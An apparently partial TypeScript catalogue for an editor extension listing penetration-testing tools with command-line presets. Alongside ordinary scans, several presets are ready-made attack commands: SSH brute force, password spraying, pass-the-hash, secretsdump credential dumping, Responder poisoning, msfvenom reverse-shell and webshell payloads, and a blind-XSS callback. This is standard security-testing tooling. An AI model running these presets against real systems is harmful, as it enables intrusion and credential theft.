/*---------------------------------------------------------------------------------------------
 *  Copyright (c) HCode. All rights reserved.
 *  Licensed under the MIT License.
 *--------------------------------------------------------------------------------------------*/

export interface SecurityTool {
	/** Unique identifier */
	id: string;
	/** Display name */
	name: string;
	/** CLI binary name to check with `which` */
	binary: string;
	/** Short description */
	description: string;
	/** Category for grouping */
	category: ToolCategory;
	/** GitHub repo or official page URL */
	source: string;
	/** Install hint shown if not found */
	installHint: string;
	/**
	 * Argument presets the user can pick from.
	 * `{target}` is replaced at runtime with the user-provided target.
	 */
	presets: ToolPreset[];
}

export type ToolCategory =
	| 'recon'
	| 'web'
	| 'network'
	| 'password'
	| 'fuzzing'
	| 'exploitation'
	| 'post-exploitation'
	| 'osint'
	| 'secrets'
	| 'cloud'
	| 'ctf-analysis';

export interface ToolPreset {
	label: string;
	description: string;
	/** Full argument string; {target} is substituted at run time */
	args: string;
}

export const TOOLS: SecurityTool[] = [
	// ── Recon ────────────────────────────────────────────────────────────────
	{
		id: 'nmap',
		name: 'nmap',
		binary: 'nmap',
		description: 'Network mapper — port scanner and service fingerprinter',
		category: 'recon',
		source: 'https://github.com/nmap/nmap',
		installHint: 'brew install nmap  OR  sudo apt install nmap',
		presets: [
			{ label: 'Quick scan (top 1000 ports)', description: '-sV -T4 {target}', args: '-sV -T4 {target}' },
			{ label: 'Full port scan', description: '-sV -T4 -p- {target}', args: '-sV -T4 -p- {target}' },
			{ label: 'OS detection + scripts', description: '-sV -sC -O {target}', args: '-sV -sC -O {target}' },
			{ label: 'UDP top 100', description: '-sU --top-ports 100 {target}', args: '-sU --top-ports 100 {target}' },
			{ label: 'Vuln scripts', description: '--script vuln {target}', args: '--script vuln {target}' },
			{ label: 'Stealth SYN scan', description: '-sS -T2 {target}', args: '-sS -T2 {target}' },
		],
	},
	{
		id: 'rustscan',
		name: 'rustscan',
		binary: 'rustscan',
		description: 'Blazing fast port scanner — scans all 65k ports in seconds then hands off to nmap',
		category: 'recon',
		source: 'https://github.com/RustScan/RustScan',
		installHint: 'cargo install rustscan  OR  docker pull rustscan/rustscan',
		presets: [
			{ label: 'Full scan → nmap', description: '-a {target} -- -sV', args: '-a {target} -- -sV' },
			{ label: 'Fast all ports', description: '-a {target} --ulimit 5000', args: '-a {target} --ulimit 5000' },
			{ label: 'Scripts + banners', description: '-a {target} -- -sC -sV', args: '-a {target} -- -sC -sV' },
		],
	},
	{
		id: 'subfinder',
		name: 'subfinder',
		binary: 'subfinder',
		description: 'Fast passive subdomain discovery',
		category: 'recon',
		source: 'https://github.com/projectdiscovery/subfinder',
		installHint: 'go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest',
		presets: [
			{ label: 'Basic enumeration', description: '-d {target}', args: '-d {target}' },
			{ label: 'All sources + silent', description: '-d {target} -all -silent', args: '-d {target} -all -silent' },
			{ label: 'Output to file', description: '-d {target} -o subs.txt', args: '-d {target} -o subs.txt' },
		],
	},
	{
		id: 'amass',
		name: 'amass',
		binary: 'amass',
		description: 'In-depth subdomain enumeration and attack surface mapping',
		category: 'recon',
		source: 'https://github.com/owasp-amass/amass',
		installHint: 'brew install amass  OR  go install github.com/owasp-amass/amass/v4/...@master',
		presets: [
			{ label: 'Passive enum', description: 'enum -passive -d {target}', args: 'enum -passive -d {target}' },
			{ label: 'Active enum', description: 'enum -active -d {target}', args: 'enum -active -d {target}' },
			{ label: 'Intel whois', description: 'intel -whois -d {target}', args: 'intel -whois -d {target}' },
		],
	},
	{
		id: 'httpx',
		name: 'httpx',
		binary: 'httpx',
		description: 'Fast HTTP probing — check live hosts, status codes, tech',
		category: 'recon',
		source: 'https://github.com/projectdiscovery/httpx',
		installHint: 'go install github.com/projectdiscovery/httpx/cmd/httpx@latest',
		presets: [
			{ label: 'Probe single target', description: '-u {target} -title -tech-detect -status-code', args: '-u {target} -title -tech-detect -status-code' },
			{ label: 'Probe list (stdin)', description: 'cat subs.txt | httpx -title -status-code', args: '-l subs.txt -title -status-code' },
		],
	},
	{
		id: 'whatweb',
		name: 'whatweb',
		binary: 'whatweb',
		description: 'Web fingerprinting — identify CMS, frameworks, plugins',
		category: 'recon',
		source: 'https://github.com/urbanadventurer/WhatWeb',
		installHint: 'sudo apt install whatweb  OR  gem install whatweb',
		presets: [
			{ label: 'Normal scan', description: '{target}', args: '{target}' },
			{ label: 'Aggressive', description: '-a 3 {target}', args: '-a 3 {target}' },
		],
	},

	// ── Web ──────────────────────────────────────────────────────────────────
	{
		id: 'sqlmap',
		name: 'sqlmap',
		binary: 'sqlmap',
		description: 'Automatic SQL injection detection and exploitation',
		category: 'web',
		source: 'https://github.com/sqlmapproject/sqlmap',
		installHint: 'pip3 install sqlmap  OR  sudo apt install sqlmap',
		presets: [
			{ label: 'Basic GET scan', description: '-u {target} --batch', args: '-u {target} --batch' },
			{ label: 'POST + forms', description: '-u {target} --forms --batch', args: '-u {target} --forms --batch' },
			{ label: 'Dump databases', description: '-u {target} --dbs --batch', args: '-u {target} --dbs --batch' },
			{ label: 'Level 5 risk', description: '-u {target} --level=5 --risk=3 --batch', args: '-u {target} --level=5 --risk=3 --batch' },
		],
	},
	{
		id: 'nikto',
		name: 'nikto',
		binary: 'nikto',
		description: 'Web server scanner — misconfigs, outdated software, vulnerabilities',
		category: 'web',
		source: 'https://github.com/sullo/nikto',
		installHint: 'sudo apt install nikto  OR  brew install nikto',
		presets: [
			{ label: 'Basic scan', description: '-h {target}', args: '-h {target}' },
			{ label: 'SSL scan', description: '-h {target} -ssl', args: '-h {target} -ssl' },
			{ label: 'Tuned (XSS, SQLi)', description: '-h {target} -Tuning 1,2', args: '-h {target} -Tuning 1,2' },
		],
	},

	// ── Fuzzing ──────────────────────────────────────────────────────────────
	{
		id: 'ffuf',
		name: 'ffuf',
		binary: 'ffuf',
		description: 'Fast web fuzzer — directory, parameter, vhost brute-force',
		category: 'fuzzing',
		source: 'https://github.com/ffuf/ffuf',
		installHint: 'go install github.com/ffuf/ffuf/v2@latest',
		presets: [
			{ label: 'Directory fuzzing', description: '-u {target}/FUZZ -w /usr/share/wordlists/dirb/common.txt', args: '-u {target}/FUZZ -w /usr/share/wordlists/dirb/common.txt' },
			{ label: 'Vhost discovery', description: '-u {target} -H "Host: FUZZ.{target}" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt', args: '-u {target} -H "Host: FUZZ" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt' },
			{ label: 'GET param fuzz', description: '-u {target}?FUZZ=test -w params.txt', args: '-u {target}?FUZZ=test -w params.txt' },
		],
	},
	{
		id: 'gobuster',
		name: 'gobuster',
		binary: 'gobuster',
		description: 'Directory/DNS brute-forcing tool',
		category: 'fuzzing',
		source: 'https://github.com/OJ/gobuster',
		installHint: 'go install github.com/OJ/gobuster/v3@latest  OR  sudo apt install gobuster',
		presets: [
			{ label: 'Dir scan', description: 'dir -u {target} -w /usr/share/wordlists/dirb/common.txt', args: 'dir -u {target} -w /usr/share/wordlists/dirb/common.txt' },
			{ label: 'DNS brute', description: 'dns -d {target} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt', args: 'dns -d {target} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt' },
			{ label: 'Vhost enum', description: 'vhost -u {target} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt', args: 'vhost -u {target} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt' },
		],
	},

	// ── Password ─────────────────────────────────────────────────────────────
	{
		id: 'hydra',
		name: 'hydra',
		binary: 'hydra',
		description: 'Network login brute-forcer (SSH, HTTP, FTP, SMB, …)',
		category: 'password',
		source: 'https://github.com/vanhauser-thc/thc-hydra',
		installHint: 'sudo apt install hydra  OR  brew install hydra',
		presets: [
			{ label: 'SSH brute (user list)', description: '-L users.txt -P /usr/share/wordlists/rockyou.txt {target} ssh', args: '-L users.txt -P /usr/share/wordlists/rockyou.txt {target} ssh' },
			{ label: 'HTTP POST form', description: '-l admin -P /usr/share/wordlists/rockyou.txt {target} http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"', args: '-l admin -P rockyou.txt {target} http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"' },
			{ label: 'FTP brute', description: '-L users.txt -P passes.txt {target} ftp', args: '-L users.txt -P passes.txt {target} ftp' },
		],
	},
	{
		id: 'hashcat',
		name: 'hashcat',
		binary: 'hashcat',
		description: 'GPU-accelerated password hash cracker',
		category: 'password',
		source: 'https://github.com/hashcat/hashcat',
		installHint: 'sudo apt install hashcat  OR  brew install hashcat',
		presets: [
			{ label: 'MD5 wordlist', description: '-m 0 {target} /usr/share/wordlists/rockyou.txt', args: '-m 0 {target} /usr/share/wordlists/rockyou.txt' },
			{ label: 'SHA-256 wordlist', description: '-m 1400 {target} rockyou.txt', args: '-m 1400 {target} rockyou.txt' },
			{ label: 'WPA2 handshake', description: '-m 2500 {target} rockyou.txt', args: '-m 2500 {target} rockyou.txt' },
			{ label: 'NTLM wordlist', description: '-m 1000 {target} rockyou.txt', args: '-m 1000 {target} rockyou.txt' },
		],
	},
	{
		id: 'john',
		name: 'john',
		binary: 'john',
		description: 'John the Ripper password cracker',
		category: 'password',
		source: 'https://github.com/openwall/john',
		installHint: 'sudo apt install john  OR  brew install john',
		presets: [
			{ label: 'Auto detect + crack', description: '{target}', args: '{target}' },
			{ label: 'Wordlist mode', description: '--wordlist=/usr/share/wordlists/rockyou.txt {target}', args: '--wordlist=/usr/share/wordlists/rockyou.txt {target}' },
			{ label: 'Show cracked', description: '--show {target}', args: '--show {target}' },
		],
	},

	// ── Network ──────────────────────────────────────────────────────────────
	{
		id: 'masscan',
		name: 'masscan',
		binary: 'masscan',
		description: 'Mass IP port scanner — fastest scanner for large ranges',
		category: 'network',
		source: 'https://github.com/robertdavidgraham/masscan',
		installHint: 'sudo apt install masscan  OR  brew install masscan',
		presets: [
			{ label: 'Top ports (rate=1000)', description: '{target} -p80,443,22,21,25,8080,8443 --rate=1000', args: '{target} -p80,443,22,21,25,8080,8443 --rate=1000' },
			{ label: 'All ports', description: '{target} -p0-65535 --rate=10000', args: '{target} -p0-65535 --rate=10000' },
		],
	},
	{
		id: 'netcat',
		name: 'nc',
		binary: 'nc',
		description: 'Netcat — raw TCP/UDP connections, reverse shells, listeners',
		category: 'network',
		source: 'https://github.com/diegocr/netcat',
		installHint: 'sudo apt install netcat  OR  brew install netcat',
		presets: [
			{ label: 'Banner grab', description: '-nv {target} 80', args: '-nv {target} 80' },
			{ label: 'Start listener (port 4444)', description: '-lvnp 4444', args: '-lvnp 4444' },
			{ label: 'Port scan range', description: '-zv {target} 1-1000', args: '-zv {target} 1-1000' },
		],
	},

	// ── OSINT ────────────────────────────────────────────────────────────────
	{
		id: 'whois',
		name: 'whois',
		binary: 'whois',
		description: 'Domain / IP registration and ownership lookup',
		category: 'osint',
		source: 'https://github.com/rfc1036/whois',
		installHint: 'sudo apt install whois  OR  brew install whois',
		presets: [
			{ label: 'WHOIS lookup', description: '{target}', args: '{target}' },
		],
	},
	{
		id: 'dig',
		name: 'dig',
		binary: 'dig',
		description: 'DNS interrogation tool',
		category: 'osint',
		source: 'https://github.com/isc-projects/bind9',
		installHint: 'sudo apt install dnsutils  OR  brew install bind',
		presets: [
			{ label: 'A record', description: '{target} A', args: '{target} A' },
			{ label: 'All records', description: '{target} ANY', args: '{target} ANY' },
			{ label: 'MX records', description: '{target} MX', args: '{target} MX' },
			{ label: 'Zone transfer attempt', description: '{target} AXFR', args: '{target} AXFR' },
		],
	},

	// ── Additional Recon ─────────────────────────────────────────────────────
	{
		id: 'naabu',
		name: 'naabu',
		binary: 'naabu',
		description: 'Fast port discovery by ProjectDiscovery',
		category: 'recon',
		source: 'https://github.com/projectdiscovery/naabu',
		installHint: 'go install github.com/projectdiscovery/naabu/v2/cmd/naabu@latest',
		presets: [
			{ label: 'Top 100 ports', description: '-host {target} -top-ports 100', args: '-host {target} -top-ports 100' },
			{ label: 'All ports', description: '-host {target} -p -', args: '-host {target} -p -' },
			{ label: 'With nmap pipe', description: '-host {target} -nmap-cli "nmap -sV"', args: '-host {target} -nmap-cli "nmap -sV"' },
		],
	},
	{
		id: 'dnsx',
		name: 'dnsx',
		binary: 'dnsx',
		description: 'Fast DNS toolkit for bulk resolution and brute-forcing',
		category: 'recon',
		source: 'https://github.com/projectdiscovery/dnsx',
		installHint: 'go install github.com/projectdiscovery/dnsx/cmd/dnsx@latest',
		presets: [
			{ label: 'Resolve from file', description: '-l subs.txt -resp', args: '-l subs.txt -resp' },
			{ label: 'CNAME lookup', description: '-l subs.txt -cname', args: '-l subs.txt -cname' },
			{ label: 'Brute subdomains', description: '-d {target} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt', args: '-d {target} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt' },
		],
	},
	{
		id: 'katana',
		name: 'katana',
		binary: 'katana',
		description: 'Next-gen crawling framework by ProjectDiscovery',
		category: 'recon',
		source: 'https://github.com/projectdiscovery/katana',
		installHint: 'go install github.com/projectdiscovery/katana/cmd/katana@latest',
		presets: [
			{ label: 'Basic crawl', description: '-u {target}', args: '-u {target}' },
			{ label: 'Deep crawl (depth 5)', description: '-u {target} -d 5', args: '-u {target} -d 5' },
			{ label: 'JavaScript crawling', description: '-u {target} -js-crawl -d 3', args: '-u {target} -js-crawl -d 3' },
		],
	},
	{
		id: 'gau',
		name: 'gau',
		binary: 'gau',
		description: 'Fetch known URLs from AlienVault, Wayback, Common Crawl, URLScan',
		category: 'recon',
		source: 'https://github.com/lc/gau',
		installHint: 'go install github.com/lc/gau/v2/cmd/gau@latest',
		presets: [
			{ label: 'Fetch all URLs', description: '{target}', args: '{target}' },
			{ label: 'Filter subdomains', description: '--subs {target}', args: '--subs {target}' },
			{ label: 'Output to file', description: '{target} --o urls.txt', args: '{target} --o urls.txt' },
		],
	},
	{
		id: 'waybackurls',
		name: 'waybackurls',
		binary: 'waybackurls',
		description: 'Fetch all URLs from Wayback Machine for a domain',
		category: 'recon',
		source: 'https://github.com/tomnomnom/waybackurls',
		installHint: 'go install github.com/tomnomnom/waybackurls@latest',
		presets: [
			{ label: 'Fetch all', description: '{target}', args: '{target}' },
		],
	},
	{
		id: 'nuclei',
		name: 'nuclei',
		binary: 'nuclei',
		description: 'Fast vulnerability scanner with community templates',
		category: 'recon',
		source: 'https://github.com/projectdiscovery/nuclei',
		installHint: 'go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest',
		presets: [
			{ label: 'Scan with all templates', description: '-u {target}', args: '-u {target}' },
			{ label: 'Severity: critical+high', description: '-u {target} -severity critical,high', args: '-u {target} -severity critical,high' },
			{ label: 'CVE templates only', description: '-u {target} -tags cve', args: '-u {target} -tags cve' },
			{ label: 'Tech detection', description: '-u {target} -tags tech', args: '-u {target} -tags tech' },
			{ label: 'Update templates', description: '-update-templates', args: '-update-templates' },
		],
	},
	{
		id: 'hakrawler',
		name: 'hakrawler',
		binary: 'hakrawler',
		description: 'Fast web crawler for discovering endpoints and assets (hakluke)',
		category: 'recon',
		source: 'https://github.com/hakluke/hakrawler',
		installHint: 'go install github.com/hakluke/hakrawler@latest',
		presets: [
			{ label: 'Crawl domain', description: 'echo {target} | hakrawler', args: '{target}' },
			{ label: 'Deep crawl depth 3', description: 'echo {target} | hakrawler -d 3', args: '{target}' },
		],
	},
	{
		id: 'theHarvester',
		name: 'theHarvester',
		binary: 'theHarvester',
		description: 'OSINT tool — emails, names, subdomains, IPs from public sources',
		category: 'recon',
		source: 'https://github.com/laramies/theHarvester',
		installHint: 'sudo apt install theharvester  OR  pip3 install theHarvester',
		presets: [
			{ label: 'All sources', description: '-d {target} -b all', args: '-d {target} -b all' },
			{ label: 'Google + Bing', description: '-d {target} -b google,bing', args: '-d {target} -b google,bing' },
		],
	},
	{
		id: 'spiderfoot',
		name: 'spiderfoot',
		binary: 'spiderfoot',
		description: 'Automated OSINT framework with 200+ modules',
		category: 'recon',
		source: 'https://github.com/smicallef/spiderfoot',
		installHint: 'pip3 install spiderfoot  OR  sudo apt install spiderfoot',
		presets: [
			{ label: 'Quick scan', description: '-s {target} -q', args: '-s {target} -q' },
			{ label: 'Full passive', description: '-s {target} -t INTERNET_NAME,EMAILADDR,IP_ADDRESS', args: '-s {target} -t INTERNET_NAME,EMAILADDR,IP_ADDRESS' },
		],
	},

	// ── Additional Web ────────────────────────────────────────────────────────
	{
		id: 'dalfox',
		name: 'dalfox',
		binary: 'dalfox',
		description: 'Fast XSS scanner and parameter analyser',
		category: 'web',
		source: 'https://github.com/hahwul/dalfox',
		installHint: 'go install github.com/hahwul/dalfox/v2@latest',
		presets: [
			{ label: 'Scan URL', description: 'url {target}', args: 'url {target}' },
			{ label: 'Pipe from file', description: 'file urls.txt', args: 'file urls.txt' },
			{ label: 'Blind XSS hook', description: 'url {target} -b https://xss.yourdomain.com', args: 'url {target} -b https://xss.yourdomain.com' },
		],
	},
	{
		id: 'arjun',
		name: 'arjun',
		binary: 'arjun',
		description: 'HTTP parameter discovery suite',
		category: 'web',
		source: 'https://github.com/s0md3v/Arjun',
		installHint: 'pip3 install arjun',
		presets: [
			{ label: 'GET params', description: '-u {target}', args: '-u {target}' },
			{ label: 'POST params', description: '-u {target} -m POST', args: '-u {target} -m POST' },
			{ label: 'JSON params', description: '-u {target} -m JSON', args: '-u {target} -m JSON' },
		],
	},
	{
		id: 'corscanner',
		name: 'CORScanner',
		binary: 'python3',
		description: 'CORS misconfiguration scanner',
		category: 'web',
		source: 'https://github.com/chenjj/CORScanner',
		installHint: 'pip3 install CORScanner',
		presets: [
			{ label: 'Scan single URL', description: '-u {target}', args: '-u {target}' },
			{ label: 'Verbose scan', description: '-u {target} -v', args: '-u {target} -v' },
		],
	},
	{
		id: 'commix',
		name: 'commix',
		binary: 'commix',
		description: 'Automated command injection and exploitation tool',
		category: 'web',
		source: 'https://github.com/commixproject/commix',
		installHint: 'sudo apt install commix  OR  pip3 install commix',
		presets: [
			{ label: 'Auto detect + exploit', description: '-u {target} --batch', args: '-u {target} --batch' },
			{ label: 'All HTTP methods', description: '-u {target} --all-techniques --batch', args: '-u {target} --all-techniques --batch' },
		],
	},

	// ── Additional Fuzzing ────────────────────────────────────────────────────
	{
		id: 'feroxbuster',
		name: 'feroxbuster',
		binary: 'feroxbuster',
		description: 'Fast, recursive content discovery with auto-calibration',
		category: 'fuzzing',
		source: 'https://github.com/epi052/feroxbuster',
		installHint: 'cargo install feroxbuster  OR  sudo apt install feroxbuster',
		presets: [
			{ label: 'Recursive scan', description: '-u {target} -w /usr/share/seclists/Discovery/Web-Content/common.txt', args: '-u {target} -w /usr/share/seclists/Discovery/Web-Content/common.txt' },
			{ label: 'With extensions', description: '-u {target} -w common.txt -x php,html,js', args: '-u {target} -w common.txt -x php,html,js' },
			{ label: 'Quiet mode', description: '-u {target} -w common.txt -q', args: '-u {target} -w common.txt -q' },
		],
	},
	{
		id: 'dirsearch',
		name: 'dirsearch',
		binary: 'dirsearch',
		description: 'Advanced web path scanner (maurosoria)',
		category: 'fuzzing',
		source: 'https://github.com/maurosoria/dirsearch',
		installHint: 'pip3 install dirsearch  OR  sudo apt install dirsearch',
		presets: [
			{ label: 'Default scan', description: '-u {target}', args: '-u {target}' },
			{ label: 'With extensions', description: '-u {target} -e php,asp,aspx,html,js', args: '-u {target} -e php,asp,aspx,html,js' },
			{ label: 'Recursive', description: '-u {target} -r', args: '-u {target} -r' },
		],
	},
	{
		id: 'wfuzz',
		name: 'wfuzz',
		binary: 'wfuzz',
		description: 'Web application fuzzer for headers, cookies, forms',
		category: 'fuzzing',
		source: 'https://github.com/xmendez/wfuzz',
		installHint: 'pip3 install wfuzz  OR  sudo apt install wfuzz',
		presets: [
			{ label: 'Dir fuzz', description: '-c -z file,/usr/share/wordlists/dirb/common.txt --hc 404 {target}/FUZZ', args: '-c -z file,/usr/share/wordlists/dirb/common.txt --hc 404 {target}/FUZZ' },
			{ label: 'Auth brute', description: '-c -z file,users.txt -z file,passes.txt --hc 401 -u {target} --basic FUZZ:FUZ2Z', args: '-c -z file,users.txt -z file,passes.txt --hc 401 -u {target} --basic FUZZ:FUZ2Z' },
		],
	},

	// ── Additional Network ────────────────────────────────────────────────────
	{
		id: 'enum4linux',
		name: 'enum4linux',
		binary: 'enum4linux',
		description: 'Enumerate SMB/NetBIOS info from Windows/Samba hosts',
		category: 'network',
		source: 'https://github.com/CiscoCXSecurity/enum4linux',
		installHint: 'sudo apt install enum4linux',
		presets: [
			{ label: 'All enumeration', description: '-a {target}', args: '-a {target}' },
			{ label: 'Users + shares', description: '-U -S {target}', args: '-U -S {target}' },
			{ label: 'Null session', description: '-n {target}', args: '-n {target}' },
		],
	},
	{
		id: 'smbmap',
		name: 'smbmap',
		binary: 'smbmap',
		description: 'SMB share enumeration and file access checker',
		category: 'network',
		source: 'https://github.com/ShawnDEvans/smbmap',
		installHint: 'pip3 install smbmap  OR  sudo apt install smbmap',
		presets: [
			{ label: 'Null auth list shares', description: '-H {target}', args: '-H {target}' },
			{ label: 'Auth with creds', description: '-H {target} -u user -p pass', args: '-H {target} -u user -p pass' },
			{ label: 'Recursive listing', description: '-H {target} -R', args: '-H {target} -R' },
		],
	},
	{
		id: 'netexec',
		name: 'netexec',
		binary: 'netexec',
		description: 'Network service exploitation framework (CrackMapExec successor)',
		category: 'network',
		source: 'https://github.com/Pennyw0rth/NetExec',
		installHint: 'pip3 install netexec',
		presets: [
			{ label: 'SMB enum', description: 'smb {target} -u guest -p ""', args: 'smb {target} -u guest -p ""' },
			{ label: 'Password spray', description: 'smb {target} -u users.txt -p Password123', args: 'smb {target} -u users.txt -p Password123' },
			{ label: 'Pass the hash', description: 'smb {target} -u admin -H <NTHASH> --exec-method smbexec -x whoami', args: 'smb {target} -u admin -H NTHASH --exec-method smbexec -x whoami' },
		],
	},
	{
		id: 'responder',
		name: 'responder',
		binary: 'responder',
		description: 'LLMNR/NBT-NS/mDNS poisoner for credential capture',
		category: 'network',
		source: 'https://github.com/lgandx/Responder',
		installHint: 'sudo apt install responder  OR  git clone https://github.com/lgandx/Responder',
		presets: [
			{ label: 'Listen on interface', description: '-I {target} -rdwv', args: '-I {target} -rdwv' },
			{ label: 'Analyze mode (no poison)', description: '-I {target} -A', args: '-I {target} -A' },
		],
	},
	{
		id: 'evil-winrm',
		name: 'evil-winrm',
		binary: 'evil-winrm',
		description: 'WinRM shell for pentesting Windows targets',
		category: 'network',
		source: 'https://github.com/Hackplayers/evil-winrm',
		installHint: 'gem install evil-winrm',
		presets: [
			{ label: 'Connect with creds', description: '-i {target} -u admin -p password', args: '-i {target} -u admin -p password' },
			{ label: 'Connect with hash', description: '-i {target} -u admin -H NTHASH', args: '-i {target} -u admin -H NTHASH' },
			{ label: 'With SSL', description: '-i {target} -u admin -p password -S', args: '-i {target} -u admin -p password -S' },
		],
	},

	// ── Exploitation ──────────────────────────────────────────────────────────
	{
		id: 'msfconsole',
		name: 'msfconsole',
		binary: 'msfconsole',
		description: 'Metasploit Framework interactive console',
		category: 'exploitation',
		source: 'https://github.com/rapid7/metasploit-framework',
		installHint: 'sudo apt install metasploit-framework  OR  curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall',
		presets: [
			{ label: 'Launch console', description: '-q', args: '-q' },
			{ label: 'Run resource script', description: '-r {target}', args: '-r {target}' },
			{ label: 'Exploit with options', description: '-q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST {target}; run"', args: '-q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST {target}; run"' },
		],
	},
	{
		id: 'msfvenom',
		name: 'msfvenom',
		binary: 'msfvenom',
		description: 'Metasploit payload generator and encoder',
		category: 'exploitation',
		source: 'https://github.com/rapid7/metasploit-framework',
		installHint: 'sudo apt install metasploit-framework',
		presets: [
			{ label: 'Windows reverse TCP EXE', description: '-p windows/meterpreter/reverse_tcp LHOST={target} LPORT=4444 -f exe -o shell.exe', args: '-p windows/meterpreter/reverse_tcp LHOST={target} LPORT=4444 -f exe -o shell.exe' },
			{ label: 'Linux reverse ELF', description: '-p linux/x86/shell_reverse_tcp LHOST={target} LPORT=4444 -f elf -o shell.elf', args: '-p linux/x86/shell_reverse_tcp LHOST={target} LPORT=4444 -f elf -o shell.elf' },
			{ label: 'PHP webshell', description: '-p php/meterpreter_reverse_tcp LHOST={target} LPORT=4444 -f raw > shell.php', args: '-p php/meterpreter_reverse_tcp LHOST={target} LPORT=4444 -f raw' },
		],
	},

	// ── Post-Exploitation ─────────────────────────────────────────────────────
	{
		id: 'linpeas',
		name: 'linpeas',
		binary: 'linpeas.sh',
		description: 'Linux Privilege Escalation Awesome Script (carlospolop)',
		category: 'post-exploitation',
		source: 'https://github.com/carlospolop/PEASS-ng',
		installHint: 'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh && chmod +x linpeas.sh',
		presets: [
			{ label: 'Run all checks', description: '{target}', args: '{target}' },
			{ label: 'Fast mode', description: '-f {target}', args: '-f {target}' },
			{ label: 'Network only', description: '-n', args: '-n' },
		],
	},
	{
		id: 'pspy',
		name: 'pspy',
		binary: 'pspy64',
		description: 'Unprivileged Linux process snooping — spy on cron + processes',
		category: 'post-exploitation',
		source: 'https://github.com/DominicBreuker/pspy',
		installHint: 'wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64 && chmod +x pspy64',
		presets: [
			{ label: 'Watch processes', description: '', args: '' },
			{ label: 'Print commands and file system events', description: '-pf -i 1000', args: '-pf -i 1000' },
		],
	},
	{
		id: 'secretsdump',
		name: 'impacket-secretsdump',
		binary: 'impacket-secretsdump',
		description: 'Dump NTDS.dit, SAM, LSA secrets from Windows hosts (Impacket)',
		category: 'post-exploitation',
		source: 'https://github.com/fortra/impacket',
		installHint: 'pip3 install impacket',
		presets: [
			{ label: 'Remote dump via SMB', description: 'domain/user:pass@{target}', args: 'domain/user:pass@{target}' },
			{ label: 'Pass the hash', description: '-hashes :NTHASH domain/user@{target}', args: '-hashes :NTHASH domain/user@{target}' },
			{ label: 'Just NTLM hashes', description: 'domain/user:pass@{target} -just-dc-ntlm', args: 'domain/user:pass@{target} -just-dc-ntlm' },
		],
	},

	// ── Secrets ───────────────────────────────────────────────────────────────
	{
		id: 'gitleaks',
		name: 'gitleaks',
		binary: 'gitleaks',
		description: 'Detect secrets (API keys, passwords) in git repos',
		category: 'secrets',
		source: 'https://github.com/gitleaks/gitleaks',
		installHint: 'brew install gitleaks  OR  go install github.com/gitleaks/gitleaks/v8@latest',
		presets: [
			{ label: 'Scan current repo', description: 'detect --source . -v', args: 'detect --source . -v' },
			{ label: 'Scan remote repo', description: 'detect --source {target} -v', args: 'detect --source {target} -v' },
			{ label: 'Generate report', description: 'detect --source . --report-format json --report-path secrets.json', args: 'detect --source . --report-format json --report-path secrets.json' },
		],
	},
	{
		id: 'trufflehog',
		name: 'trufflehog',
		binary: 'trufflehog',
		description: 'Find leaked credentials in git history, S3, GitHub, etc.',
		category: 'secrets',
		source: 'https://github.com/trufflesecurity/trufflehog',
		installHint: 'brew install trufflehog  OR  go install github.com/trufflesecurity/trufflehog/v3@latest',
		presets: [
			{ label: 'Scan git repo', description: 'git {target}', args: 'git {target}' },
			{ label: 'Scan GitHub org', description: 'github --org={target}', args: 'github --org={target}' },
			{ label: 'Scan S3 bucket', description: 's3 --bucket={target}', args: 's3 --bucket={target}' },
		],
	},

	// ── Cloud ─────────────────────────────────────────────────────────────────
	{
		id: 'awscli',
		name: 'aws',
		binary: 'aws',
		description: 'AWS CLI — enumerate IAM, S3, EC2, Lambda for cloud pentesting',
		category: 'cloud',
		source: 'https://github.com/aws/aws-cli',
		installHint: 'pip3 install awscli  OR  brew install awscli',
		presets: [
			{ label: 'Get caller identity', description: 'sts get-caller-identity', args: 'sts get-caller-identity' },
			{ label: 'List S3 buckets', description: 's3 ls', args: 's3 ls' },
			{ label: 'List IAM users', description: 'iam list-users', args: 'iam list-users' },
			{ label: 'List EC2 instances', description: 'ec2 describe-instances --region {target}', args: 'ec2 describe-instances --region {target}' },
		],
	},
	{
		id: 's3scanner',
		name: 's3scanner',
		binary: 's3scanner',
		description: 'Scan for open S3 buckets and dump their contents',
		category: 'cloud',
		source: 'https://github.com/sa7mon/S3Scanner',
		installHint: 'pip3 install s3scanner  OR  go install github.com/sa7mon/S3Scanner@latest',
		presets: [
			{ label: 'Scan bucket', description: 'scan --bucket {target}', args: 'scan --bucket {target}' },
			{ label: 'Scan from wordlist', description: 'scan --bucket-file buckets.txt', args: 'scan --bucket-file buckets.txt' },
			{ label: 'Dump public bucket', description: 'dump --bucket {target} -d ./output', args: 'dump --bucket {target} -d ./output' },
		],
	},

	// ── CTF Analysis ──────────────────────────────────────────────────────────
	{
		id: 'binwalk',
		name: 'binwalk',
		binary: 'binwalk',
		description: 'Firmware/binary analysis — extract embedded files and data',
		category: 'ctf-analysis',
		source: 'https://github.com/ReFirmLabs/binwalk',
		installHint: 'sudo apt install binwalk  OR  pip3 install binwalk',
		presets: [
			{ label: 'Scan and extract', description: '-e {target}', args: '-e {target}' },
			{ label: 'File signature scan', description: '{target}', args: '{target}' },
			{ label: 'Entropy analysis', description: '-E {target}', args: '-E {target}' },
		],
	},
	{
		id: 'strings',
		name: 'strings',
		binary: 'strings',
		description: 'Extract printable strings from binary files',
		category: 'ctf-analysis',
		source: 'https://www.gnu.org/software/binutils/',
		installHint: 'sudo apt install binutils  OR  brew install binutils',
		presets: [
